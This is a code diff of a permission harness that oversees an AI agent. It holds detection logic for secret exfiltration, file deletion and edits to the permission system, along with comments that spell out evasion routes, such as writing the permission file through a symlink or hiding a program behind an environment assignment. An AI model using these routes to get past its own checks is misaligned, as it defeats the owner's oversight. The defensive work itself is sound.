@@ -18,12 +18,19 @@ import { CREATED_ENTRY, CreatedStore, creationsOf } from "./created.ts";
 import type { CreationFacts, CreationPlan } from "./created.ts";
 import type { CatalogueFacts } from "./catalogue.ts";
 import { genericDestroyer, targetsOf } from "./catalogue.ts";
-import { readTool } from "./tools.ts";
-import { entryCovers, Ledger, ledgerFile, taintFile } from "./ledger.ts";
+import { readTool, remoteEffect } from "./tools.ts";
+import { entryCovers, Ledger, ledgerFile, ledgerKind, OTHER_TASK_FLOOR, taintFile, taskRelation } from "./ledger.ts";
 import type { LedgerEntity, LedgerEntry } from "./ledger.ts";
 import { Denials, denialsFile, forRecord } from "./denials.ts";
 import type { ActionClass, DenialRecord, DenialScope } from "./denials.ts";
 import { commandEffects, unwrapped } from "./effects.ts";
+import { consumerWords, groupOperand, passes, RUNTIME, runtimeOperand } from "./flow.ts";
+import { offMachinePlace, runsElsewhere } from "./defaults.ts";
+import { COMMAND_STARTS, commandText, LOCAL_CONSUMERS, namedRemote, OUTPUT_OPTIONS, OWN_CREDENTIAL, PLAIN_PROGRAMS, REMOTE_RUNNERS, secretByContent, TEXT_OPTIONS } from "./defaults.ts";
+import { projectScripts, readText, scheduledLines, shellLines, triggeredHooks, unreadParts } from "./scripts.ts";
+import type { ProjectScript } from "./scripts.ts";
+import { apiDestroys, DELETING_SUBCOMMAND, folderPackage, typedTargets, withEnvOptions } from "./schema.ts";
+import type { RuntimeOperand } from "./flow.ts";
 import type { EffectClass } from "./effects.ts";
 import type { LifecycleFacts } from "./lifecycle.ts";
 import type { PullRequestFact } from "./entities.ts";
@@ -41,12 +48,13 @@ import {
 import { globBase, hasGlob } from "./glob.ts";
 import { GRANT_ENTRY, GrantStore, newGrant, REVOKE_ENTRY, ROOT_ENTRY } from "./grants.ts";
 import type { Grant, GrantScope } from "./grants.ts";
-import { checkDataConsent, checkExplicit, consentText, describeAttribute, describeTarget, lineTargets, mentions, repoName, scanConsents, scanDataConsent } from "./explicit.ts";
+import { listWords } from "./lexicon.ts";
+import { checkDataConsent, checkExplicit, CONDITION_WORDS, consentText, describeAttribute, describeTarget, KEEP_WORDS, lineTargets, mentions, ownSpeech, ownText, QUESTION, repoName, scanConsents, scanDataConsent } from "./explicit.ts";
 import type { ExplicitClaim, ExplicitFacts, ExplicitResult, LineTargets, OwnerWords, Target, TargetFacts } from "./explicit.ts";
 import { answeredByConsent, conversationContext, judgePrompt, JUDGE_SYSTEM_PROMPT, parseVerdict } from "./judge.ts";
 import type { Concern, JudgeEvidence, JudgeRequest } from "./judge.ts";
 import { floorOf } from "./floor.ts";
-import type { FloorHit } from "./floor.ts";
+import type { FloorHit, FloorSubject } from "./floor.ts";
 import { describeGrade, gradesOf, kindGrades } from "./grades.ts";
 import { isUnder, PathContext } from "./paths.ts";
 import type { Classification } from "./paths.ts";
@@ -54,16 +62,17 @@ import { decide, describe } from "./policy.ts";
 import type { Verdict } from "./policy.ts";
 import { compilePolicy, landstripStatus, splitSelf, startFilterProxy, tempDirs } from "./sandbox.ts";
 import type { CompiledPolicy, ConcretePaths, FilterProxy, LandstripStatus } from "./sandbox.ts";
-import { benignEnv, quietSsh, categoryPattern, describePattern, fileSha256, filterInputs, isInert, patternError, patternMatches, resolveProgram, ruleCannotVouch, unwrap } from "./commands.ts";
+import { benignEnv, systemLocation, quietSsh, categoryPattern, describePattern, fileSha256, filterInputs, isInert, patternError, patternMatches, resolveProgram, ruleCannotVouch, unwrap } from "./commands.ts";
 import type { CommandRule } from "./commands.ts";
-import { assessCommand, assessOpaque, downloadsAndRuns, exfiltrates, installedProgram, lineFlow, normalRefspec, redirectRisk, secretName, secretWrites, sinkOf, TIER_RANK, unresolvedWrites } from "./risk.ts";
+import { issuerOf, onlyReaches, usesKey } from "./risk.ts";
+import { assessCommand, assessOpaque, credentialSource, downloadsAndRuns, exfiltrates, SINK_PROGRAMS, installedProgram, lineFlow, listingSet, normalRefspec, redirectRisk, runtimeWriteSets, secretName, secretWrites, sinkOf, TIER_RANK, unresolvedWrites } from "./risk.ts";
 import type { PatternFinding } from "./risk.ts";
-import { resolvePattern, resolveText } from "./resolve.ts";
-import { codeOf, INTERPRETERS as INTERPRETER_TABLE, interpreterOf, optionCommands, scanCode, shebangInterpreter } from "./code.ts";
+import { globsIntersect, resolvePattern, resolveText } from "./resolve.ts";
+import { codeOf, DELETE_NAMES, INTERPRETERS as INTERPRETER_TABLE, interpreterOf, optionCommands, scanCode, shebangInterpreter, signaledPids } from "./code.ts";
 import type { Interpreter } from "./code.ts";
 import type { Assessment, GitFacts, KillTarget, ProcessFacts, RiskFacts, Tier } from "./risk.ts";
 import { INSPECT, inspectMatches, viewOf } from "./packs.ts";
-import { literalOutput, parseShell, UNKNOWN } from "./shell.ts";
+import { literalOutput, parseShell, setGitTop, UNKNOWN } from "./shell.ts";
 import type { ParsedLine, SimpleCommand } from "./shell.ts";
 
 export const UNAVAILABLE_ENTRY = "cypher-permissions.unavailable";
@@ -132,6 +141,12 @@ export interface AccessRequest {
   path: string;
   /** The change, for writes the judge should see. */
   diff?: string;
+  /**
+   * What the write does to the file when it is more than a change of its contents (final pass; `patchOps`): a
+   * patch's `*** Delete File:` deletes it, an `*** Update File:` with `*** Move to:` moves it away. Both destroy
+   * the file at this path (the other-task floor, denials of a delete).
+   */
+  op?: "delete" | "move";
 }
 
 export interface CallInfo {
@@ -284,6 +299,12 @@ export interface LineAssessment extends Assessment {
   opaqueCode?: string[];
   /** Paths it writes whose start is known only when it runs and that could be the permission system (risk.ts `unresolvedWrites`). */
   unresolved?: string[];
+  /** Its commands with a program hidden behind an assignment shown (`hiddenBehindEnv`): what the floor's readers read. */
+  shown?: LineCommand[];
+  /** Project scripts it runs (scripts.ts), read as its lines (final pass): evidence for the judge, and no remembered grant. */
+  scripts?: ProjectScript[];
+  /** What Cypher couldn't read of it (final pass): code set up to run later, a function's arguments, a sourced file's variables. */
+  unread?: string[];
 }
 
 /** What the code a command runs does (code.ts, `Permissions.codeFindings`). */
@@ -299,6 +320,8 @@ interface CodeFinding {
   floor?: Assessment;
   /** The most dangerous line it runs (`subprocess.run(["git", "push", "--force"])`), when one is. */
   worst?: Assessment;
+  /** The project scripts it is (`scriptFinding`). */
+  scripts?: ProjectScript[];
 }
 
 /** How deep code inside code is read (a script that runs a shell line that runs python …). */
@@ -421,6 +444,29 @@ function processPlace(pid: number): { program?: string; cwd?: string } {
   return { program: program && isAbsolute(program) ? program : undefined, cwd };
 }
 
+/**
+ * What a live process is known by, besides its pid (final pass): its command line and the ports it listens on, as
+ * the producers that hand pids print or test them (`pgrep -f P` reads the command line, `lsof -t -i :PORT` the
+ * ports). Empty when it can't be read or the process is gone (a gone process can't be stopped).
+ */
+export function processDescription(pid: number): string[] {
+  if (!Number.isInteger(pid) || pid <= 0) return [];
+  const run = (program: string, args: string[]) => {
+    const result = spawnSync(program, args, { encoding: "utf8", stdio: ["ignore", "pipe", "ignore"], timeout: 2000 });
+    return result.status === 0 ? result.stdout : undefined;
+  };
+  const out: string[] = [];
+  const command = run("ps", ["-o", "command=", "-p", String(pid)])?.trim();
+  if (!command) return out;
+  out.push(command);
+  // `lsof -Fn` prints `n<address>` per socket: `*:5174`, `127.0.0.1:5174`, `[::1]:5174`.
+  for (const line of (run("lsof", ["-a", "-p", String(pid), "-i", "-P", "-n", "-Fn"]) ?? "").split("\n")) {
+    const port = /^n.*:(\d{1,5})(?:->|$)/.exec(line)?.[1];
+    if (port) out.push(`:${port}`);
+  }
+  return out;
+}
+
 /** How often the reviewing model is asked before its silence or failure goes to the user: once, and one retry. */
 const JUDGE_ATTEMPTS = 2;
 
@@ -449,6 +495,22 @@ interface LineCommand extends SimpleCommand {
 }
 
 const DIRECTORY_BUILTINS: ReadonlySet<string> = new Set(["cd", "pushd", "popd"]);
+/** Calls that delete files, in any language scanCode reads (round 6 step 2). */
+const CODE_DELETES = new RegExp(
+  `\\b(rmtree|rmSync|rmdirSync|unlinkSync|unlink|rmdir|removedirs|rm_rf|rm_r|rm_f|delete_file|deleteSync|FileUtils\\.rm\\w*|Files\\.delete\\w*|os\\.remove|fs\\.rm|fs\\.promises\\.rm|shutil\\.move|os\\.rename|File\\.delete|${Object.values(DELETE_NAMES)
+    .flat()
+    .filter((name) => /^[\w.:$]+\(?$/.test(name))
+    .map((name) => name.replace(/\($/, "").replace(/[.*+?^${}()|[\]\\]/g, "\\$&"))
+    .join("|")})\\s*\\(`,
+);
+/** Input keys of an MCP or extension tool that name a file (round 6 step 2). */
+const TOOL_PATH_KEYS = /^(path|paths|file|files|filename|filepath|file_path|dir|directory|folder|target|destination|dest|source|src|from|to|uri|location|root)$/i;
+/** Words of a tool's name by what it does to the files it names (round 6 step 2). */
+const TOOL_VERBS = { change: ["write", "create", "edit", "update", "put", "save", "append", "patch", "replace", "set", "mkdir", "copy", "upload", "insert", "modify"], destroy: ["delete", "remove", "rm", "unlink", "trash", "move", "rename", "mv", "drop", "destroy", "purge", "erase", "rmdir"] };
+/** `find`'s tests that pick some of what is under its roots (round 6 step 2). */
+const FIND_TESTS = /^-(i?name|i?path|i?wholename|i?regex|newer\w*|[acm]time|[acm]min|size|empty|user|group|perm|links)$/;
+/** Commands that destroy what they find under a root, the folder they run in (round 6 step 2): its whole subtree is their possible set. */
+const ROOT_CLEANERS: readonly { program: string; sub: readonly string[] }[] = [{ program: "git", sub: ["clean"] }];
 
 /** A danger's kind or key, by the action class a consent must ask for (lexicon.ts words). */
 const UNREAD_ACTIONS: readonly [string, RegExp][] = [
@@ -555,7 +617,36 @@ export interface PermissionsInit {
   scratch?: readonly string[];
   /** The owner's own words, as the engine passed them (`CYPHER_OWNER_WORDS`); undefined when it passed none. */
   ownerWords?: OwnerWords;
+  /**
+   * The task this chat belongs to (round 6, W3): a workspace's id for it and its threads, a plan's for its
+   * sessions (`CYPHER_TASK_ID`). Chats of one task are never each other's "other task".
+   */
+  taskId?: string;
 }
+
+/**
+ * Every way a request can be allowed (round 6, W1). Each goes through `Permissions.gate` before it allows:
+ * the owner's denials (denials.ts) and the floor's `before` rows (floor.ts) are consulted on all of them.
+ * A request with no matching denial and no floor row passes as before: no prompt, no judge call.
+ */
+export const ENTRY_POINTS = {
+  "file:policy": "a file tool's access the policy allows by default (a read in the project, a write in the workspace)",
+  "file:grant": "a file tool's access an earlier approval covers",
+  "file:rule": "a file tool's access a saved rule covers",
+  "request_permission": "paths asked for ahead that are already allowed",
+  "tool:setting": "an MCP or extension tool whose setting is allow",
+  "tool:approval": "an MCP or extension tool an earlier approval or rule covers",
+  "bash:outside": "a command a saved rule allows outside the sandbox, or one that only inspects",
+  "bash:sandbox": "a command that runs in the sandbox",
+  "bash:escalate": "a command run outside the sandbox on review",
+} as const;
+export type EntryPoint = keyof typeof ENTRY_POINTS;
+
+/** The file tools (the extension's own, and apply_patch) and the access each asks for. */
+export const FILE_TOOL_ACCESS: Readonly<Record<string, Capability>> = { read: "read", ls: "read", grep: "read", find: "read", write: "write", edit: "write", apply_patch: "write" };
+
+// The shell reader's `git rev-parse --show-toplevel` (iteration 3).
+setGitTop((dir) => gitRoots(dir).top);
 
 function gitRoots(cwd: string): { top?: string; gitDirs: string[]; gitDir?: string; common?: string } {
   try {
@@ -628,6 +719,10 @@ export class Permissions {
   readonly created: CreatedStore;
   /** The owner's Deny clicks in this chat, by action class (denials.ts). */
   readonly denials: Denials;
+  /** The task this chat belongs to (`PermissionsInit.taskId`). */
+  readonly taskId: string | undefined;
+  /** Each `gate` call's entry point, for tests (round 6, W1): undefined unless a test sets it to a list. */
+  gated: { entry: EntryPoint; held?: string }[] | undefined;
   readonly status: LandstripStatus;
   config!: PermissionsConfig;
   level!: LevelName;
@@ -685,6 +780,8 @@ export class Permissions {
     this.audit = new AuditLog(init.agentDir, init.chatId);
     this.grants = new GrantStore(init.chatId);
     this.created = new CreatedStore(init.chatId, ledgerFile(init.agentDir, init.chatId));
+    this.taskId = init.taskId ?? (process.env.CYPHER_TASK_ID || undefined);
+    this.created.ledger.task = this.taskId;
     this.taint = new Ledger(init.agentDir ? taintFile(init.agentDir, init.chatId) : undefined, init.chatId);
     this.denials = new Denials(denialsFile(init.agentDir, init.chatId), init.chatId);
     this.status = init.landstrip ?? landstripStatus();
@@ -868,12 +965,14 @@ export class Permissions {
       const classification = this.classify(request.path, ctx.cwd);
       const canonical = classification.path;
       const verdict = this.verdict(request.capability, classification);
-      if (verdict.kind === "allow") continue;
+      // Every allow below consults the owner's denials and the floor first (round 6, W1, `gate`): held, it is reviewed.
+      const held = verdict.kind === "deny" ? undefined : await this.gate(verdict.kind === "allow" ? "file:policy" : this.fileGrant(request.capability, canonical) ? "file:grant" : "file:rule", this.fileClass(call.tool, request.capability, [canonical], request.op), { permissionSystemPath: request.capability === "write" && this.paths.isPermissionSystem(canonical) !== undefined ? canonical : undefined });
+      if (verdict.kind === "allow" && !held) continue;
       if (verdict.kind === "deny") {
         this.audit.write({ tool: call.tool, capability: request.capability, zone: classification.zone, guard: classification.guard, paths: [canonical], decision: "deny", decidedBy: "policy", reason: verdict.reason });
         return { ok: false, reason: `Permission denied: ${verdict.reason}.` };
       }
-      const grant = this.fileGrant(request.capability, canonical);
+      const grant = held ? undefined : this.fileGrant(request.capability, canonical);
       if (grant) {
         this.audit.write({ tool: call.tool, capability: request.capability, zone: classification.zone, guard: classification.guard, paths: [canonical], decision: "allow", decidedBy: "grant", grantId: grant.id, scope: grant.scope });
         this.grants.used(grant);
@@ -881,7 +980,7 @@ export class Permissions {
         used("rule");
         continue;
       }
-      if (classification.zone !== "sensitive" && this.ruleCovers(request.capability, canonical)) {
+      if (!held && classification.zone !== "sensitive" && this.ruleCovers(request.capability, canonical)) {
         this.audit.write({ tool: call.tool, capability: request.capability, zone: classification.zone, guard: classification.guard, paths: [canonical], decision: "allow", decidedBy: "rule" });
         approved.add(request.capability, canonical);
         used("rule");
@@ -889,15 +988,16 @@ export class Permissions {
       }
       const outcome = await this.serialized(async () => {
         // An earlier dialog in the queue may have allowed it meanwhile.
-        if (this.fileGrant(request.capability, canonical) || (classification.zone !== "sensitive" && this.ruleCovers(request.capability, canonical))) {
+        if (!held && (this.fileGrant(request.capability, canonical) || (classification.zone !== "sensitive" && this.ruleCovers(request.capability, canonical)))) {
           return { allowed: true as const, scope: "rule" as const, by: "rule" as const };
         }
         return this.elevate(
           {
             capability: request.capability,
             classifications: [classification],
-            key: verdict.key,
-            mode: verdict.mode === "assisted" ? "assisted" : "ask",
+            key: verdict.kind === "elevate" ? verdict.key : "held",
+            mode: verdict.kind === "elevate" && verdict.mode === "assisted" ? "assisted" : "ask",
+            held,
             tool: call.tool,
             justification: call.justification,
             diff: request.diff,
@@ -936,6 +1036,14 @@ export class Permissions {
       return { ok: false, text: `Denied: ${denied.reason}.` };
     }
     const elevations = verdicts.filter((verdict): verdict is Extract<Verdict, { kind: "elevate" }> => verdict.kind === "elevate");
+    // Every request consults the owner's denials and the floor (round 6, W1), whether its paths need an elevation or not
+    // (iteration 3: one that elevated went straight to the judge, past another task's working tree).
+    const held = await this.gate("request_permission", this.fileClass("request_permission", input.capability, classifications.map((item) => item.path)));
+    if (held) {
+      const outcome = await this.serialized(() => this.elevate({ capability: input.capability, classifications, key: "held", mode: "ask", tool: "request_permission", justification: input.reason, held }, ctx));
+      if (!outcome.allowed) return { ok: false, text: outcome.reason, abort: outcome.abort };
+      return { ok: true, text: `Allowed once: ${classifications.map((item) => item.path).join(", ")}.` };
+    }
     if (elevations.length === 0) {
       return { ok: true, text: `Already allowed: ${classifications.map((item) => item.path).join(", ")}. Run the tool again; if it still fails, the cause is not a permission.` };
     }
@@ -1158,6 +1266,8 @@ export class Permissions {
       toolInput?: string;
       /** A domain a filtered command wants to reach. */
       domain?: string;
+      /** The floor row `gate` found for a request the policy, a grant or a rule would have allowed (round 6, W1). */
+      held?: FloorHit;
     },
     ctx: RequestContext,
   ): Promise<ElevateOutcome> {
@@ -1190,11 +1300,12 @@ export class Permissions {
     const floor = floorOf(
       {
         permissionSystemPath: file && request.capability === "write" ? request.classifications.map((item) => this.paths.isPermissionSystem(item.path) && item.path).find((path): path is string => typeof path === "string") : undefined,
-        ownerRule: request.mode === "ask" ? "this kind of request is set to Ask me" : undefined,
+        ownerRule: request.mode === "ask" && !request.held ? "this kind of request is set to Ask me" : undefined,
         ...(denied.active ? { ownerDenied: `you denied ${denied.active.denial.what} and haven't asked for it since` } : {}),
+        ...(request.held?.id === "other-task" && !request.held.review ? { otherTask: request.held.detail } : {}),
       },
       "before",
-    );
+    ) ?? (request.held?.review ? undefined : request.held);
     const base: AuditRecord = {
       decision: "deny",
       decidedBy: "user",
@@ -1215,10 +1326,14 @@ export class Permissions {
       // The installed app's data (the owner's chats, journals, databases): evidence, and whether the owner's words name it.
       const data = file ? paths.filter((path) => this.installedApp(path) && !installedProgram(path)) : [];
       if (data.length) await this.refreshOwnerWords();
-      const denials = denied.similar.length ? { denials: denied.similar.map((denial) => describeDenial(denial)) } : {};
+      const denials = {
+        ...(denied.similar.length ? { denials: denied.similar.map((denial) => describeDenial(denial)) } : {}),
+        // Another chat's work in this working tree, held for review (`gate`, round 6 narrowing).
+        ...(request.held?.id === "other-task" && request.held.review ? { otherChats: [request.held.detail] } : {}),
+      };
       const evidence: JudgeEvidence | undefined = data.length
         ? { installedData: { paths: data.map((path) => displayPath(path, this.home)), finding: scanDataConsent(this.ownerWords, data) }, ...denials }
-        : denied.similar.length
+        : Object.keys(denials).length
           ? denials
           : undefined;
       const reviewed = await this.review(
@@ -1245,7 +1360,8 @@ export class Permissions {
       Object.assign(base, verdict.audit);
       if (verdict.decision === "approve") {
         // Remembered for the chat, so the same access is not reviewed again; a secret, a danger, the installed app's data, or an approval of this call alone, only once.
-        const scope = sensitive || verdict.once || tier === "danger" || data.length > 0 ? "once" : "chat";
+        // Held for review (another chat's work, a deferred lift; `gate`): once, as the bash path runs it.
+        const scope = sensitive || verdict.once || tier === "danger" || data.length > 0 || request.held?.review ? "once" : "chat";
         finish({ decision: "allow", decidedBy: "judge", reason: verdict.reason, scope, prompted: false });
         return { allowed: true, scope, by: "judge" };
       }
@@ -1310,7 +1426,7 @@ export class Permissions {
   }
 
   /** A tool-level approval for an MCP or extension tool whose setting is `elevate`. */
-  async requestToolUse(name: string, input: unknown, ctx: RequestContext): Promise<{ ok: true } | { ok: false; reason: string; abort?: boolean }> {
+  async requestToolUse(name: string, input: unknown, ctx: RequestContext, options: { held?: FloorHit } = {}): Promise<{ ok: true } | { ok: false; reason: string; abort?: boolean }> {
     this.refresh();
     const key = `tool:${name}`;
     const covered = () => {
@@ -1318,7 +1434,9 @@ export class Permissions {
       if (grant) this.grants.used(grant);
       return grant !== undefined || this.config.rules.some((rule) => rule.path === key && this.ruleApplies(rule));
     };
-    if (covered()) return { ok: true };
+    // Covered by an approval, or allowed by its setting (`options.held` from the caller's `gateTool`): denials and the floor first (round 6, W1).
+    const held = options.held ?? (covered() ? await this.gateTool("tool:approval", name, input) : undefined);
+    if (!held && covered()) return { ok: true };
     const mode = approvalModeFor(this.config, "tools");
     if (mode === "deny") return { ok: false, reason: `Permission denied: the ${name} tool needs approval, which is set to always deny.` };
     let rendered = "";
@@ -1329,9 +1447,9 @@ export class Permissions {
     }
     const classification: Classification = { path: key, zone: "external", match: "tool" };
     const outcome = await this.serialized(async () =>
-      covered()
+      !held && covered()
         ? ({ allowed: true, scope: "rule", by: "rule" } as const)
-        : this.elevate({ capability: "read", classifications: [classification], key: "tools", mode, tool: name, toolInput: rendered.slice(0, 2000) }, ctx),
+        : this.elevate({ capability: "read", classifications: [classification], key: "tools", mode: held ? "ask" : mode, tool: name, toolInput: rendered.slice(0, 2000), ...(held ? { held } : {}) }, ctx),
     );
     if (!outcome.allowed) return { ok: false, reason: outcome.reason, abort: outcome.abort };
     this.rememberPseudoPath(key, outcome.scope, outcome.by);
@@ -1494,7 +1612,16 @@ export class Permissions {
     // A subshell starts where the line's shell is, and its `cd` stays in it.
     let outside: string | undefined = cwd;
     let group: number | undefined;
+    const stack: string[] = [];
+    /** Where the shell was before its last move (`cd -`), and whether `here` holds only along an `&&` chain. */
+    let previous: string | undefined;
+    let chained = false;
     for (const [index, command] of commands.entries()) {
+      // A move made sure only by an `&&` chain (`cd A && cd B && rm x`): past the chain (`;`, `||`, `&`), it may not have run.
+      if (chained && index > 0 && commands[index - 1].joint !== "&&") {
+        here = undefined;
+        chained = false;
+      }
       if (command.subshell !== group) {
         // Entering one from the line's shell, or leaving one (for the line, or the next subshell).
         if (group === undefined) outside = here;
@@ -1515,16 +1642,26 @@ export class Permissions {
         // The values in front of it and its wrappers' words: they can name the installed app too (`CYPHER_DATA_DIR=~/.cypher cmd`).
         carried: [...(command.envValues ?? []), ...(wrapped ? command.words.slice(0, command.words.length - words.length) : [])],
         wrappers: wrapped?.wrappers ?? [],
+        // A feeder's argument file is what it reads its names from (`xargs -a FILE`: iteration 2), as `< FILE` would be.
+        reads: [...command.reads, ...feederArgFiles(command.words)],
         cwd: here,
         // A system shell whose script the reader read (`bash -c '…'`, `bash <<'EOF'`) only runs the commands that follow it.
-        inert: isInert(words) || this.harmlessFilter(words, here) || (command.script === true && this.systemProgram(words[0], here)),
+        inert: isInert(words) || this.harmlessFilter(words, here) || (command.script === true && (words[0] === "eval" || this.systemProgram(words[0], here))),
         // A shell or interpreter reading code from its input, when the reader couldn't read that code.
         ...(command.script !== true && readsCode(words) && (command.reads.length > 0 || command.inputUnknown === true || commands[index - 1]?.joint === "|") ? { stdinCode: true } : {}),
       });
       if (!moves(command)) continue;
-      const [program, target, ...rest] = command.words;
-      const certain = program === "cd" && target !== undefined && target !== UNKNOWN && target !== "-" && rest.length === 0 && !command.scoped && !process.env.CDPATH;
-      here = certain && here !== undefined ? resolvePath(here, target) : undefined;
+      // Where it moves the shell (final pass, `DIRECTORY_MOVES`): `cd [-L|-P] DIR`, `pushd DIR` (onto a stack), `popd`
+      // (back to what the stack holds). Anything else (`cd -`, `pushd +N`, `CDPATH`, a scoped one): unknown from here.
+      // A move reached only after an `&&` (iteration 2): what follows it in the same chain runs only if it moved.
+      // Only when the rest of the line is that chain: a later `;`, `||` or `&` runs whether or not it moved.
+      const onChain = command.scoped && index > 0 && commands[index - 1].joint === "&&" && !command.loop && command.subshell === commands[index - 1].subshell && commands.slice(index, -1).every((later) => later.joint === "&&" || later.joint === "|");
+      const move = (command.scoped && !onChain) || process.env.CDPATH ? undefined : command.words[0] === "cd" && command.words[1] === "-" && command.words.length === 2 ? (previous === undefined ? undefined : { to: previous }) : directoryMove(command.words);
+      if (move?.push && here !== undefined) stack.push(here);
+      const before = here;
+      here = move === undefined || here === undefined ? undefined : move.pop ? stack.pop() : resolvePath(here, move.to!);
+      if (here !== undefined) previous = before;
+      if (onChain && here !== undefined) chained = true;
     }
     return out;
   }
@@ -1846,11 +1983,560 @@ export class Permissions {
     // A secret leaving the machine: the always-ask floor, for the line as a whole — the code it runs included.
     const exfiltration = exfiltrates(commands, facts, parsed.expands, code);
     const nested = [...code.values()].find((found) => found.floor)?.floor;
+    const staged = exfiltration ? undefined : (this.defaultSink(commands) ?? this.operandFloor(commands, depth) ?? this.movedIntoSystem(commands) ?? this.feederSends(commands) ?? this.globbedInputSent(commands) ?? this.bulkStagedSecret(commands) ?? this.publishedSecret(commands) ?? (depth < MAX_CODE_DEPTH ? this.urlCarriedSecret(command, cwd, depth) : undefined));
     if (exfiltration) worst = { tier: "danger", kind: exfiltration, key: "secret-off-machine", floor: true };
+    else if (staged) worst = { tier: "danger", kind: staged, key: staged.startsWith("changes the permission system") ? "permission-system" : "secret-off-machine", floor: true };
     else if (nested) worst = { tier: "danger", kind: nested.kind, key: nested.key, floor: true };
+    else {
+      // A write whose target is known only by what a listing could print (round 6, W5, risk.ts `runtimeWriteSets`).
+      const listed = runtimeWriteSets(commands, facts);
+      if (listed.length) worst = { tier: "danger", kind: listed[0], key: "permission-system", floor: true };
+    }
+    // A program hidden by an assignment in front of it (`GIT_TRACE=1 curl …`, `KUBECONFIG=… kubectl delete …`; shell.ts
+    // keeps its name as the word's hint) is still that program for the floor (iteration 2): the floor's readers (data
+    // flow, the permission system, denials, other tasks' work) read the line with it shown. The tier and the judge's
+    // reading stay the hidden program's (the variable may change how it runs: the judge's concern).
+    const revealed = parsed.commands.some(hiddenBehindEnv) ? this.commandsOf(parsed.commands.map(revealProgram), cwd) : undefined;
+    // A link the line makes and then writes or reads through (`ln -sfn AGENT /tmp/ag && echo > /tmp/ag/permissions.json`):
+    // the floor's readers read the later paths as where the link leads (iteration 2; links that already exist resolve).
+    const linked = this.throughLinks(revealed ?? commands);
+    const shown = linked ?? revealed;
+    if (shown && !worst.floor) {
+      const shownCode = this.codeFindings(shown, depth);
+      const shownExfil = exfiltrates(shown, facts, parsed.expands, shownCode);
+      const shownNested = [...shownCode.values()].find((found) => found.floor)?.floor;
+      const shownOwn = shown.map((item) => (item.inert ? redirectRisk(item, facts) : assessCommand(item, facts))).find((assessment) => assessment?.floor);
+      const shownListed = runtimeWriteSets(shown, facts);
+      if (shownExfil) worst = { tier: "danger", kind: shownExfil, key: "secret-off-machine", floor: true };
+      else if (shownNested) worst = { tier: "danger", kind: shownNested.kind, key: shownNested.key, floor: true };
+      else if (shownOwn) worst = { ...shownOwn, tier: "danger" };
+      else if (shownListed.length) worst = { tier: "danger", kind: shownListed[0], key: "permission-system", floor: true };
+    }
     const opaqueCode = [...code.values()].flatMap((found) => (found.opaque ? [`${found.origin} (${found.language}): ${found.opaque}`] : []));
     const unresolved = commands.flatMap((item) => unresolvedWrites(item, facts));
-    return { ...worst, commands, assessments, parsed, ...(opaqueCode.length ? { opaqueCode } : {}), ...(unresolved.length ? { unresolved } : {}) };
+    const scripts = [...code.values()].flatMap((found) => found.scripts ?? []);
+    // A sourced file's variables matter only where the line uses a word known only when it runs (`$TARGET`).
+    const dependsOnRuntime = commands.some((item) => item.words.includes(UNKNOWN) || item.writes.includes(UNKNOWN) || item.reads.includes(UNKNOWN));
+    const unread = unreadParts(command).filter((what) => dependsOnRuntime || !what.startsWith("the variables "));
+    return { ...worst, commands, assessments, parsed, ...(shown ? { shown } : {}), ...(opaqueCode.length ? { opaqueCode } : {}), ...(unresolved.length ? { unresolved } : {}), ...(scripts.length ? { scripts } : {}), ...(unread.length ? { unread } : {}) };
+  }
+
+  /**
+   * A secret sent by staging a folder in bulk (final pass): a line that stages by folder or by everything (`git add .`,
+   * `-A`, `--all`, a folder operand, `git commit -a`) and then pushes stages every file git doesn't ignore. Such a line
+   * sends a secret when the working tree holds one git would add: an untracked secret no ignore rule hides (`git
+   * ls-files -o --exclude-standard`), or any secret inside it when the same line first changes the ignore rules
+   * (`.gitignore`, `.git/info/exclude`, `core.excludesFile`).
+   */
+  private bulkStagedSecret(commands: readonly LineCommand[]): string | undefined {
+    const gitSub = (item: LineCommand) => {
+      const words = unwrapped(item.words);
+      if (basename(words[0] ?? "") !== "git") return undefined;
+      let i = 1;
+      while (i < words.length && words[i].startsWith("-")) i += /^-(C|c)$/.test(words[i]) ? 2 : 1;
+      return { sub: words[i], rest: words.slice(i + 1) };
+    };
+    const bulk = commands.findIndex((item) => {
+      const git = gitSub(item);
+      if (!git) return false;
+      if (git.sub === "add") return git.rest.some((word) => word === "." || word === "-A" || word === "--all" || word === "*" || word === ":/" || (word !== UNKNOWN && !word.startsWith("-") && item.cwd !== undefined && (() => { try { return statSync(this.classify(word, item.cwd).path).isDirectory(); } catch { return false; } })()));
+      return git.sub === "commit" && git.rest.some((word) => /^-[a-zA-Z]*a[a-zA-Z]*$/.test(word) || word === "--all");
+    });
+    if (bulk < 0) return undefined;
+    if (!commands.slice(bulk + 1).some((item) => gitSub(item)?.sub === "push")) return undefined;
+    const at = commands[bulk].cwd;
+    if (at === undefined) return undefined;
+    const top = gitRoots(this.paths.canonical(at, this.cwd)).top;
+    if (!top) return undefined;
+    const ignoreFile = (path: string) => /(^|\/)\.gitignore$|\/\.git\/info\/exclude$/.test(path);
+    const editsIgnore = commands.slice(0, bulk).some((item) => {
+      const view = item.words.filter((word) => word !== UNKNOWN);
+      return item.writes.some((path) => ignoreFile(path)) || (/^(sed|gsed|perl|truncate|rm|mv|cp|tee)$/.test(basename(view[0] ?? "")) && view.slice(1).some((word) => ignoreFile(word))) || (gitSub(item)?.sub === "config" && view.some((word) => /core\.excludesFile/i.test(word)));
+    });
+    if (editsIgnore) {
+      const inside = this.secretInside(top);
+      if (inside) return `sends a secret off this machine (${displayPath(inside, this.home)}, which this line un-ignores, stages and pushes) through git push`;
+      return undefined;
+    }
+    // What the bulk add stages: its pathspecs (`git add src`), else the whole tree (`-A`, `.` at the top, `commit -a`).
+    const add = gitSub(commands[bulk]);
+    const specs = add?.sub === "add" ? add.rest.filter((word) => word !== UNKNOWN && !word.startsWith("-")) : [];
+    const listed = spawnSync("git", ["-C", this.paths.canonical(at, this.cwd), "ls-files", "-o", "--exclude-standard", "--full-name", "-z", "--", ...(specs.length ? specs : [":/"])], { encoding: "utf8", stdio: ["ignore", "pipe", "ignore"], timeout: 3000 });
+    if (listed.status !== 0) return undefined;
+    for (const name of listed.stdout.split("\0").slice(0, 2000)) {
+      if (!name) continue;
+      const classification = this.classify(join(top, name), top);
+      if (classification.zone === "sensitive") return `sends a secret off this machine (${displayPath(classification.path, this.home)}, untracked and not ignored, which this line stages and pushes) through git push`;
+    }
+    return undefined;
+  }
+
+  /** The line's commands with paths under a link an earlier command of it makes rewritten to its target; undefined: none. */
+  private throughLinks(commands: readonly LineCommand[]): LineCommand[] | undefined {
+    const links: { link: string; target: string }[] = [];
+    let changed = false;
+    const out = commands.map((item) => {
